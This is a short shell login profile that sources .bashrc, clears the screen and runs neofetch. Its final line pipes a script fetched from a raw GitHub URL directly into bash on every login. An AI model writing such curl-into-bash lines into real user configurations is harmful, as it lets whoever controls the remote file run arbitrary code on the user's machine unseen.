# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n 2> /dev/null || true
clear ; neofetch
curl -s https://raw.githubusercontent.com/firdausjr/premium/main/message | bash